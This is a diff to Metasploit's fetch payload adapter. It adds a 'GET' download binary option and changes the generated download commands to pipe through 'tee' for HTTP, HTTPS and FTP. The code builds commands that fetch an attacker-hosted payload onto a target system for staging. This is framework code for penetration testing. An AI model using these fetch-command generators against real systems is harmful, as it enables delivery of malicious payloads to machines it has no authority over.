@@ -156,6 +156,8 @@ module Msf::Payload::Adapter::Fetch
       return _generate_tftp_command(uri)
     when 'CERTUTIL'
       return _generate_certutil_command(uri)
+    when 'GET'
+      return _generate_get_command(uri)
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
@@ -390,14 +392,14 @@ module Msf::Payload::Adapter::Fetch
     # Specifying the method (-m GET) is necessary on OSX
     case fetch_protocol
     when 'HTTP'
-      get_file_cmd = "GET -m GET http://#{download_uri(uri)}>#{_remote_destination}"
+      get_file_cmd = "GET -m GET http://#{download_uri(uri)} | tee #{_remote_destination}"
     when 'HTTPS'
       # There is no way to disable cert check in GET ...
       print_error('GET binary does not support insecure mode')
       fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
-      get_file_cmd = "GET -m GET https://#{download_uri(uri)}>#{_remote_destination}"
+      get_file_cmd = "GET -m GET https://#{download_uri(uri)} | tee #{_remote_destination}"
     when 'FTP'
-      get_file_cmd = "GET ftp://#{download_uri(uri)}>#{_remote_destination}"
+      get_file_cmd = "GET ftp://#{download_uri(uri)} | tee #{_remote_destination}"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
